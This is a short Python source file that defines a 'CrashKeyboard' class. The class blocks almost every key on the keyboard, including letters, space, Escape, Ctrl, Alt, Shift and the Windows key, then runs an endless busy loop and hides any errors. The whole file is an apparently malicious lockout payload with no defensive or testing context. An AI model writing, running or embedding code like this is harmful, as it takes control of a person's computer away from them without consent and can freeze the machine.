import keyboard as kb

class CrashKeyboard():
    def keyboard():
        try:
            block = [
                "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
                "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "\n",
                "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
                "*", "-", "=", "+", "|", "`",
                "\t", " ", "shift", "windows", "alt", "esc", "backspace", "ctrl"
            ]
            for key in block:
                kb.block_key(key)

            while True:
                pass
        except:
            pass
